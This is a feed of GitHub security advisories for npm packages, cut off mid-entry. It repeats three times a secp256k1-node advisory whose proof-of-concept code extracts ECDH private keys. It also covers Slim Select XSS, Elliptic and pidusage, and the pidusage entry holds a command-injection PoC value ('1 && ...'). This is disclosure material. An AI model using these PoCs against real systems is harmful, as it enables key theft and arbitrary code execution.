<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/npm.rss</id>
    <title>Security Advisory for JavaScript packages hosted at npmjs.com</title>
    <updated>2024-10-22T15:01:25.660Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"/>
    <subtitle>Security Advisory for JavaScript packages hosted at npmjs.com on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[secp256k1] secp256k1-node allows private key extraction over ECDH]]></title>
        <id>https://github.com/advisories/GHSA-584q-6j8j-r5pm</id>
        <link href="https://github.com/advisories/GHSA-584q-6j8j-r5pm"/>
        <updated>2024-10-21T19:09:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In <code>elliptic</code>-based version, <code>loadUncompressedPublicKey</code> has a check that the public key is on the curve: <a href="https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39">https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39</a></p>
<p><code>loadCompressedPublicKey</code> is, however, missing that check: <a href="https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19">https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19</a></p>
<p>That allows the attacker to use public keys on low-cardinality curves to extract enough information to fully restore the private key from as little as 11 ECDH sessions, and very cheaply on compute power</p>
<p>Other operations on public keys are also affected, including e.g. <code>publicKeyVerify()</code> incorrectly returning <code>true</code> on those invalid keys, and e.g. <code>publicKeyTweakMul()</code> also returning predictable outcomes allowing to restore the tweak </p>
<h3 id="details">Details</h3>
<p>The curve equation is <code>Y^2 = X^3 + 7</code>, and it restores <code>Y</code> from <code>X</code> in <code>loadCompressedPublicKey</code>, using <code>Y = sqrt(X^3 + 7)</code>, but when there are no valid <code>Y</code> values satisfying <code>Y^2 = X^3 + 7</code> for a given <code>X</code>, the same code calculates a solution for <code>-Y^2 = X^3 + 7</code>, and that solution also satisfies some other equation <code>Y^2 = X^3 + D</code>, where <code>D</code> is not equal to 7 and might be on a curve with factorizable cardinality, so <code>(X,Y)</code> might be a low-order point on that curve, lowering the number of possible ECDH output values to bruteforcable</p>
<p>Those output values correspond to remainders which can be then combined with Chinese remainder theorem to restore the original value</p>
<p>Endomorphism-based multiplication only slightly hinders restoration and does not affect the fact that the result is low-order</p>
<p>10 different malicious X values could be chosen so that the overall extracted information is 238.4 bits out of 256 bit private key, and the rest is trivially bruteforcable with an additional 11th public key (which might be valid or not -- not significant)</p>
<p>The attacker does not need to <em>receive</em> the ECDH value, they only need to be able to confirm it against a list of possible candidates, e.g. check if using it to decipher block/stream cipher would work -- and that could all be done locally on the attacker side</p>
<h3 id="poc">PoC</h3>
<h4 id="example-public-key">Example public key</h4>
<p>This key has order 39
One of the possible outcomes for it is a throw, 38 are predictable ECDH values
Keys used in full attack have higher order (starting from ~20000), so are very unlikely to cause an error</p>
<pre><code class="language-js">import secp256k1 from 'secp256k1/elliptic.js'
import { randomBytes } from 'crypto'

const pub = Buffer.from('028ac57f9c6399282773c116ef21f7394890b6140aa6f25c181e9a91e2a9e3da45', 'hex')

const seen = new Set()
for (let i = 0; i &lt; 1000; i++) {
  try {
    seen.add(Buffer.from(secp256k1.ecdh(pub, randomBytes(32))).toString('hex'))
  } catch {
    seen.add('failure also is an outcome')
  }
}

console.log(seen.size) // 39
</code></pre>
<h4 id="full-attack">Full attack</h4>
<p>This PoC doesn't list the exact public keys or the code for <code>solver.js</code> intentionally, but this exact code works, on arbitrary random private keys:</p>
<pre><code class="language-js">// Only the elliptic version is affected, gyp one isn't
// Node.js can use both, Web/RN/bundles always use the elliptic version
import secp256k1 from 'secp256k1/elliptic.js'

import { randomBytes } from 'node:crypto'
import assert from 'node:assert/strict'
import { Solver } from './solver.js'

const privateKey = randomBytes(32)

// The full dataset is precomputed on a single MacBook Air in a few days and can be reused for any private key
const solver = new Solver

// We need to run on 10 specially crafted public keys for this
// Lower than 10 is possible but requires more compute
for (let i = 0; i &lt; 10; i++) {
  const letMeIn = solver.ping() // this is a normal 33-byte Uint8Array, a 02/03-prefixed compressed public key
  assert(letMeIn instanceof Uint8Array) // true
  assert(secp256k1.publicKeyVerify(letMeIn)) // true

  // Returning ecdh value is not necessary but is used in this demo for simplicity
  // Solver needs to _confirm_ an ecdh value against a set of precalculated known ones,
  // which can be done even after it's hashed or used e.g. for a stream/block cipher, based on the encrypted data
  solver.callback(secp256k1.ecdh(letMeIn, privateKey))

  // Btw we have those precomputed so we can actually use those sessions to lower suspicion, most -- instantly
}

// Now, we need a single valid (or another invalid) public key to recheck things against
// It can be anything, e.g. we can specify an 11th one, or create a valid one and use it
// We'll be able to confirm/restore and use the ecdh value for this session too upon privateKey extraction
const anyPublicKey = secp256k1.publicKeyCreate(randomBytes(32))
assert(secp256k1.publicKeyVerify(anyPublicKey)) // true (obviously)

// Full complexity of this exploit requires solver to perform ~ 2^35 ecdh value checks (for all 10 keys combined),
// which is ~ 1 TiB -- that can be done offline and does not require any further interaction with the target
// The exact speed of the comparison step depends on how the ecdh values are used, but is not very significant
// Direct non-indexed linear scan over all possible (precomputed) values takes &lt;10 minutes on a MacBook Air
// Confirming against e.g. cipher output would be somewhat slower, but still definitely possible + also could be precomputed
const extracted = solver.stab(anyPublicKey, secp256k1.ecdh(anyPublicKey, privateKey))

console.log(`Extracted private key:  ${extracted.toString('hex')}`)
console.log(`Actual private key was: ${privateKey.toString('hex')}`)

assert(extracted.toString('hex') === privateKey.toString('hex'))

console.log('Oops')
</code></pre>
<p>Result:</p>
<pre><code class="language-console">Extracted private key:  e3370b1e6726a6ceaa51a2aacf419e25244e0cde08596780da021b238b74df3d
Actual private key was: e3370b1e6726a6ceaa51a2aacf419e25244e0cde08596780da021b238b74df3d
Oops
node example.js  178.80s user 13.59s system 74% cpu 4:17.01 total
</code></pre>
<h3 id="impact">Impact</h3>
<p>Remote private key is extracted over 11 ECDH sessions</p>
<p>The attack is very low-cost, precompute took a few days on a single MacBook Air, and extraction takes ~10 minutes on the same MacBook Air</p>
<p>Also:</p>
<ul>
<li><code>publicKeyVerify()</code> misreports malicious public keys as valid</li>
<li>Same affects tweak extraction from <code>publicKeyTweakMul</code> result and other public key operations</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/security/advisories/GHSA-584q-6j8j-r5pm">https://github.com/cryptocoinjs/secp256k1-node/security/advisories/GHSA-584q-6j8j-r5pm</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/commit/9a15fff274f83a6ec7f675f1121babcc0c42292f">https://github.com/cryptocoinjs/secp256k1-node/commit/9a15fff274f83a6ec7f675f1121babcc0c42292f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48930">https://nvd.nist.gov/vuln/detail/CVE-2024-48930</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/commit/8bd6446e000fa59df3cda0ae3e424300747ea5ed">https://github.com/cryptocoinjs/secp256k1-node/commit/8bd6446e000fa59df3cda0ae3e424300747ea5ed</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/commit/e256905ee649a7caacc251f7c964667195a52221">https://github.com/cryptocoinjs/secp256k1-node/commit/e256905ee649a7caacc251f7c964667195a52221</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19">https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39">https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39</a></li>
<li><a href="https://github.com/advisories/GHSA-584q-6j8j-r5pm">https://github.com/advisories/GHSA-584q-6j8j-r5pm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-584q-6j8j-r5pm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-21T17:28:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[secp256k1] secp256k1-node allows private key extraction over ECDH]]></title>
        <id>https://github.com/advisories/GHSA-584q-6j8j-r5pm</id>
        <link href="https://github.com/advisories/GHSA-584q-6j8j-r5pm"/>
        <updated>2024-10-21T19:09:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In <code>elliptic</code>-based version, <code>loadUncompressedPublicKey</code> has a check that the public key is on the curve: <a href="https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39">https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39</a></p>
<p><code>loadCompressedPublicKey</code> is, however, missing that check: <a href="https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19">https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19</a></p>
<p>That allows the attacker to use public keys on low-cardinality curves to extract enough information to fully restore the private key from as little as 11 ECDH sessions, and very cheaply on compute power</p>
<p>Other operations on public keys are also affected, including e.g. <code>publicKeyVerify()</code> incorrectly returning <code>true</code> on those invalid keys, and e.g. <code>publicKeyTweakMul()</code> also returning predictable outcomes allowing to restore the tweak </p>
<h3 id="details">Details</h3>
<p>The curve equation is <code>Y^2 = X^3 + 7</code>, and it restores <code>Y</code> from <code>X</code> in <code>loadCompressedPublicKey</code>, using <code>Y = sqrt(X^3 + 7)</code>, but when there are no valid <code>Y</code> values satisfying <code>Y^2 = X^3 + 7</code> for a given <code>X</code>, the same code calculates a solution for <code>-Y^2 = X^3 + 7</code>, and that solution also satisfies some other equation <code>Y^2 = X^3 + D</code>, where <code>D</code> is not equal to 7 and might be on a curve with factorizable cardinality, so <code>(X,Y)</code> might be a low-order point on that curve, lowering the number of possible ECDH output values to bruteforcable</p>
<p>Those output values correspond to remainders which can be then combined with Chinese remainder theorem to restore the original value</p>
<p>Endomorphism-based multiplication only slightly hinders restoration and does not affect the fact that the result is low-order</p>
<p>10 different malicious X values could be chosen so that the overall extracted information is 238.4 bits out of 256 bit private key, and the rest is trivially bruteforcable with an additional 11th public key (which might be valid or not -- not significant)</p>
<p>The attacker does not need to <em>receive</em> the ECDH value, they only need to be able to confirm it against a list of possible candidates, e.g. check if using it to decipher block/stream cipher would work -- and that could all be done locally on the attacker side</p>
<h3 id="poc">PoC</h3>
<h4 id="example-public-key">Example public key</h4>
<p>This key has order 39
One of the possible outcomes for it is a throw, 38 are predictable ECDH values
Keys used in full attack have higher order (starting from ~20000), so are very unlikely to cause an error</p>
<pre><code class="language-js">import secp256k1 from 'secp256k1/elliptic.js'
import { randomBytes } from 'crypto'

const pub = Buffer.from('028ac57f9c6399282773c116ef21f7394890b6140aa6f25c181e9a91e2a9e3da45', 'hex')

const seen = new Set()
for (let i = 0; i &lt; 1000; i++) {
  try {
    seen.add(Buffer.from(secp256k1.ecdh(pub, randomBytes(32))).toString('hex'))
  } catch {
    seen.add('failure also is an outcome')
  }
}

console.log(seen.size) // 39
</code></pre>
<h4 id="full-attack">Full attack</h4>
<p>This PoC doesn't list the exact public keys or the code for <code>solver.js</code> intentionally, but this exact code works, on arbitrary random private keys:</p>
<pre><code class="language-js">// Only the elliptic version is affected, gyp one isn't
// Node.js can use both, Web/RN/bundles always use the elliptic version
import secp256k1 from 'secp256k1/elliptic.js'

import { randomBytes } from 'node:crypto'
import assert from 'node:assert/strict'
import { Solver } from './solver.js'

const privateKey = randomBytes(32)

// The full dataset is precomputed on a single MacBook Air in a few days and can be reused for any private key
const solver = new Solver

// We need to run on 10 specially crafted public keys for this
// Lower than 10 is possible but requires more compute
for (let i = 0; i &lt; 10; i++) {
  const letMeIn = solver.ping() // this is a normal 33-byte Uint8Array, a 02/03-prefixed compressed public key
  assert(letMeIn instanceof Uint8Array) // true
  assert(secp256k1.publicKeyVerify(letMeIn)) // true

  // Returning ecdh value is not necessary but is used in this demo for simplicity
  // Solver needs to _confirm_ an ecdh value against a set of precalculated known ones,
  // which can be done even after it's hashed or used e.g. for a stream/block cipher, based on the encrypted data
  solver.callback(secp256k1.ecdh(letMeIn, privateKey))

  // Btw we have those precomputed so we can actually use those sessions to lower suspicion, most -- instantly
}

// Now, we need a single valid (or another invalid) public key to recheck things against
// It can be anything, e.g. we can specify an 11th one, or create a valid one and use it
// We'll be able to confirm/restore and use the ecdh value for this session too upon privateKey extraction
const anyPublicKey = secp256k1.publicKeyCreate(randomBytes(32))
assert(secp256k1.publicKeyVerify(anyPublicKey)) // true (obviously)

// Full complexity of this exploit requires solver to perform ~ 2^35 ecdh value checks (for all 10 keys combined),
// which is ~ 1 TiB -- that can be done offline and does not require any further interaction with the target
// The exact speed of the comparison step depends on how the ecdh values are used, but is not very significant
// Direct non-indexed linear scan over all possible (precomputed) values takes &lt;10 minutes on a MacBook Air
// Confirming against e.g. cipher output would be somewhat slower, but still definitely possible + also could be precomputed
const extracted = solver.stab(anyPublicKey, secp256k1.ecdh(anyPublicKey, privateKey))

console.log(`Extracted private key:  ${extracted.toString('hex')}`)
console.log(`Actual private key was: ${privateKey.toString('hex')}`)

assert(extracted.toString('hex') === privateKey.toString('hex'))

console.log('Oops')
</code></pre>
<p>Result:</p>
<pre><code class="language-console">Extracted private key:  e3370b1e6726a6ceaa51a2aacf419e25244e0cde08596780da021b238b74df3d
Actual private key was: e3370b1e6726a6ceaa51a2aacf419e25244e0cde08596780da021b238b74df3d
Oops
node example.js  178.80s user 13.59s system 74% cpu 4:17.01 total
</code></pre>
<h3 id="impact">Impact</h3>
<p>Remote private key is extracted over 11 ECDH sessions</p>
<p>The attack is very low-cost, precompute took a few days on a single MacBook Air, and extraction takes ~10 minutes on the same MacBook Air</p>
<p>Also:</p>
<ul>
<li><code>publicKeyVerify()</code> misreports malicious public keys as valid</li>
<li>Same affects tweak extraction from <code>publicKeyTweakMul</code> result and other public key operations</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/security/advisories/GHSA-584q-6j8j-r5pm">https://github.com/cryptocoinjs/secp256k1-node/security/advisories/GHSA-584q-6j8j-r5pm</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/commit/9a15fff274f83a6ec7f675f1121babcc0c42292f">https://github.com/cryptocoinjs/secp256k1-node/commit/9a15fff274f83a6ec7f675f1121babcc0c42292f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48930">https://nvd.nist.gov/vuln/detail/CVE-2024-48930</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/commit/8bd6446e000fa59df3cda0ae3e424300747ea5ed">https://github.com/cryptocoinjs/secp256k1-node/commit/8bd6446e000fa59df3cda0ae3e424300747ea5ed</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/commit/e256905ee649a7caacc251f7c964667195a52221">https://github.com/cryptocoinjs/secp256k1-node/commit/e256905ee649a7caacc251f7c964667195a52221</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19">https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39">https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39</a></li>
<li><a href="https://github.com/advisories/GHSA-584q-6j8j-r5pm">https://github.com/advisories/GHSA-584q-6j8j-r5pm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-584q-6j8j-r5pm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-21T17:28:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[secp256k1] secp256k1-node allows private key extraction over ECDH]]></title>
        <id>https://github.com/advisories/GHSA-584q-6j8j-r5pm</id>
        <link href="https://github.com/advisories/GHSA-584q-6j8j-r5pm"/>
        <updated>2024-10-21T19:09:45.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>In <code>elliptic</code>-based version, <code>loadUncompressedPublicKey</code> has a check that the public key is on the curve: <a href="https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39">https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39</a></p>
<p><code>loadCompressedPublicKey</code> is, however, missing that check: <a href="https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19">https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19</a></p>
<p>That allows the attacker to use public keys on low-cardinality curves to extract enough information to fully restore the private key from as little as 11 ECDH sessions, and very cheaply on compute power</p>
<p>Other operations on public keys are also affected, including e.g. <code>publicKeyVerify()</code> incorrectly returning <code>true</code> on those invalid keys, and e.g. <code>publicKeyTweakMul()</code> also returning predictable outcomes allowing to restore the tweak </p>
<h3 id="details">Details</h3>
<p>The curve equation is <code>Y^2 = X^3 + 7</code>, and it restores <code>Y</code> from <code>X</code> in <code>loadCompressedPublicKey</code>, using <code>Y = sqrt(X^3 + 7)</code>, but when there are no valid <code>Y</code> values satisfying <code>Y^2 = X^3 + 7</code> for a given <code>X</code>, the same code calculates a solution for <code>-Y^2 = X^3 + 7</code>, and that solution also satisfies some other equation <code>Y^2 = X^3 + D</code>, where <code>D</code> is not equal to 7 and might be on a curve with factorizable cardinality, so <code>(X,Y)</code> might be a low-order point on that curve, lowering the number of possible ECDH output values to bruteforcable</p>
<p>Those output values correspond to remainders which can be then combined with Chinese remainder theorem to restore the original value</p>
<p>Endomorphism-based multiplication only slightly hinders restoration and does not affect the fact that the result is low-order</p>
<p>10 different malicious X values could be chosen so that the overall extracted information is 238.4 bits out of 256 bit private key, and the rest is trivially bruteforcable with an additional 11th public key (which might be valid or not -- not significant)</p>
<p>The attacker does not need to <em>receive</em> the ECDH value, they only need to be able to confirm it against a list of possible candidates, e.g. check if using it to decipher block/stream cipher would work -- and that could all be done locally on the attacker side</p>
<h3 id="poc">PoC</h3>
<h4 id="example-public-key">Example public key</h4>
<p>This key has order 39
One of the possible outcomes for it is a throw, 38 are predictable ECDH values
Keys used in full attack have higher order (starting from ~20000), so are very unlikely to cause an error</p>
<pre><code class="language-js">import secp256k1 from 'secp256k1/elliptic.js'
import { randomBytes } from 'crypto'

const pub = Buffer.from('028ac57f9c6399282773c116ef21f7394890b6140aa6f25c181e9a91e2a9e3da45', 'hex')

const seen = new Set()
for (let i = 0; i &lt; 1000; i++) {
  try {
    seen.add(Buffer.from(secp256k1.ecdh(pub, randomBytes(32))).toString('hex'))
  } catch {
    seen.add('failure also is an outcome')
  }
}

console.log(seen.size) // 39
</code></pre>
<h4 id="full-attack">Full attack</h4>
<p>This PoC doesn't list the exact public keys or the code for <code>solver.js</code> intentionally, but this exact code works, on arbitrary random private keys:</p>
<pre><code class="language-js">// Only the elliptic version is affected, gyp one isn't
// Node.js can use both, Web/RN/bundles always use the elliptic version
import secp256k1 from 'secp256k1/elliptic.js'

import { randomBytes } from 'node:crypto'
import assert from 'node:assert/strict'
import { Solver } from './solver.js'

const privateKey = randomBytes(32)

// The full dataset is precomputed on a single MacBook Air in a few days and can be reused for any private key
const solver = new Solver

// We need to run on 10 specially crafted public keys for this
// Lower than 10 is possible but requires more compute
for (let i = 0; i &lt; 10; i++) {
  const letMeIn = solver.ping() // this is a normal 33-byte Uint8Array, a 02/03-prefixed compressed public key
  assert(letMeIn instanceof Uint8Array) // true
  assert(secp256k1.publicKeyVerify(letMeIn)) // true

  // Returning ecdh value is not necessary but is used in this demo for simplicity
  // Solver needs to _confirm_ an ecdh value against a set of precalculated known ones,
  // which can be done even after it's hashed or used e.g. for a stream/block cipher, based on the encrypted data
  solver.callback(secp256k1.ecdh(letMeIn, privateKey))

  // Btw we have those precomputed so we can actually use those sessions to lower suspicion, most -- instantly
}

// Now, we need a single valid (or another invalid) public key to recheck things against
// It can be anything, e.g. we can specify an 11th one, or create a valid one and use it
// We'll be able to confirm/restore and use the ecdh value for this session too upon privateKey extraction
const anyPublicKey = secp256k1.publicKeyCreate(randomBytes(32))
assert(secp256k1.publicKeyVerify(anyPublicKey)) // true (obviously)

// Full complexity of this exploit requires solver to perform ~ 2^35 ecdh value checks (for all 10 keys combined),
// which is ~ 1 TiB -- that can be done offline and does not require any further interaction with the target
// The exact speed of the comparison step depends on how the ecdh values are used, but is not very significant
// Direct non-indexed linear scan over all possible (precomputed) values takes &lt;10 minutes on a MacBook Air
// Confirming against e.g. cipher output would be somewhat slower, but still definitely possible + also could be precomputed
const extracted = solver.stab(anyPublicKey, secp256k1.ecdh(anyPublicKey, privateKey))

console.log(`Extracted private key:  ${extracted.toString('hex')}`)
console.log(`Actual private key was: ${privateKey.toString('hex')}`)

assert(extracted.toString('hex') === privateKey.toString('hex'))

console.log('Oops')
</code></pre>
<p>Result:</p>
<pre><code class="language-console">Extracted private key:  e3370b1e6726a6ceaa51a2aacf419e25244e0cde08596780da021b238b74df3d
Actual private key was: e3370b1e6726a6ceaa51a2aacf419e25244e0cde08596780da021b238b74df3d
Oops
node example.js  178.80s user 13.59s system 74% cpu 4:17.01 total
</code></pre>
<h3 id="impact">Impact</h3>
<p>Remote private key is extracted over 11 ECDH sessions</p>
<p>The attack is very low-cost, precompute took a few days on a single MacBook Air, and extraction takes ~10 minutes on the same MacBook Air</p>
<p>Also:</p>
<ul>
<li><code>publicKeyVerify()</code> misreports malicious public keys as valid</li>
<li>Same affects tweak extraction from <code>publicKeyTweakMul</code> result and other public key operations</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/security/advisories/GHSA-584q-6j8j-r5pm">https://github.com/cryptocoinjs/secp256k1-node/security/advisories/GHSA-584q-6j8j-r5pm</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/commit/9a15fff274f83a6ec7f675f1121babcc0c42292f">https://github.com/cryptocoinjs/secp256k1-node/commit/9a15fff274f83a6ec7f675f1121babcc0c42292f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48930">https://nvd.nist.gov/vuln/detail/CVE-2024-48930</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/commit/8bd6446e000fa59df3cda0ae3e424300747ea5ed">https://github.com/cryptocoinjs/secp256k1-node/commit/8bd6446e000fa59df3cda0ae3e424300747ea5ed</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/commit/e256905ee649a7caacc251f7c964667195a52221">https://github.com/cryptocoinjs/secp256k1-node/commit/e256905ee649a7caacc251f7c964667195a52221</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19">https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L17-L19</a></li>
<li><a href="https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39">https://github.com/cryptocoinjs/secp256k1-node/blob/6d3474b81d073cc9c8cc8cfadb580c84f8df5248/lib/elliptic.js#L37-L39</a></li>
<li><a href="https://github.com/advisories/GHSA-584q-6j8j-r5pm">https://github.com/advisories/GHSA-584q-6j8j-r5pm</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-584q-6j8j-r5pm</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-10-21T17:28:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[slim-select] Slim Select has potential Cross-site Scripting issue]]></title>
        <id>https://github.com/advisories/GHSA-qvqv-mcxr-x8qw</id>
        <link href="https://github.com/advisories/GHSA-qvqv-mcxr-x8qw"/>
        <updated>2024-10-18T15:03:41.000Z</updated>
        <content type="html"><![CDATA[<p>Slim Select 2.0 versions through 2.9.0 are affected by a potential cross-site scripting vulnerability. In select.ts:createOption(), the text variable from the user-provided Options object is assigned to an innerHTML without sanitation. Software that depends on this library to dynamically generate lists using unsanitized user-provided input may be vulnerable to cross-site scripting, resulting in attacker executed JavaScript. This vulnerability is fixed in 2.9.2.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-9440">https://nvd.nist.gov/vuln/detail/CVE-2024-9440</a></li>
<li><a href="https://github.com/brianvoe/slim-select/issues/564">https://github.com/brianvoe/slim-select/issues/564</a></li>
<li><a href="https://github.com/brianvoe/slim-select/blob/e7e37e2ff90e125f846bd98d6b8f278524ead79e/src/slim-select/select.ts#L377">https://github.com/brianvoe/slim-select/blob/e7e37e2ff90e125f846bd98d6b8f278524ead79e/src/slim-select/select.ts#L377</a></li>
<li><a href="https://vulncheck.com/advisories/slim-select-xss">https://vulncheck.com/advisories/slim-select-xss</a></li>
<li><a href="https://github.com/brianvoe/slim-select/pull/572">https://github.com/brianvoe/slim-select/pull/572</a></li>
<li><a href="https://github.com/brianvoe/slim-select/commit/f8534f27d6e9bab89024d139f1c4f7555f1efd5e">https://github.com/brianvoe/slim-select/commit/f8534f27d6e9bab89024d139f1c4f7555f1efd5e</a></li>
<li><a href="https://github.com/advisories/GHSA-qvqv-mcxr-x8qw">https://github.com/advisories/GHSA-qvqv-mcxr-x8qw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qvqv-mcxr-x8qw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-10-02T21:30:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[elliptic] Valid ECDSA signatures erroneously rejected in Elliptic]]></title>
        <id>https://github.com/advisories/GHSA-fc9h-whq2-v747</id>
        <link href="https://github.com/advisories/GHSA-fc9h-whq2-v747"/>
        <updated>2024-10-17T22:05:19.000Z</updated>
        <content type="html"><![CDATA[<p>The Elliptic package 6.5.7 for Node.js, in its for ECDSA implementation, does not correctly verify valid signatures if the hash contains at least four leading 0 bytes and when the order of the elliptic curve's base point is smaller than the hash, because of an _truncateToN anomaly. This leads to valid signatures being rejected. Legitimate transactions or communications may be incorrectly flagged as invalid.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-48948">https://nvd.nist.gov/vuln/detail/CVE-2024-48948</a></li>
<li><a href="https://github.com/indutny/elliptic/issues/321">https://github.com/indutny/elliptic/issues/321</a></li>
<li><a href="https://github.com/indutny/elliptic/pull/322">https://github.com/indutny/elliptic/pull/322</a></li>
<li><a href="https://github.com/advisories/GHSA-fc9h-whq2-v747">https://github.com/advisories/GHSA-fc9h-whq2-v747</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fc9h-whq2-v747</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-10-15T15:30:56.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pidusage] PIDUsage Enables OS Command Injection]]></title>
        <id>https://github.com/advisories/GHSA-h2p3-h48h-9jj7</id>
        <link href="https://github.com/advisories/GHSA-h2p3-h48h-9jj7"/>
        <updated>2024-10-16T16:50:15.000Z</updated>
        <content type="html"><![CDATA[<h3 id="overview">Overview</h3>
<p>Affected versions of pidusage pass unsanitized input to <code>child_process.exec()</code>, resulting in arbitrary code execution in the <code>ps</code> method.</p>
<p>This package is vulnerable to this PoC on Darwin, SunOS, FreeBSD, and AIX.</p>
<p>Windows and Linux are not vulnerable.</p>
<h3 id="proof-of-concept">Proof of Concept</h3>
<pre><code class="language-js">var pid = require('pidusage');
pid.stat('1 &amp;&amp; /usr/local/bin/python');
</code></pre>
<h3 id="remediation">Remediation</h3>
<p>Update to version 1.1.5 or later.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2017-1000220">https://nvd.nist.gov/vuln/detail/CVE-2017-1000220</a></li>
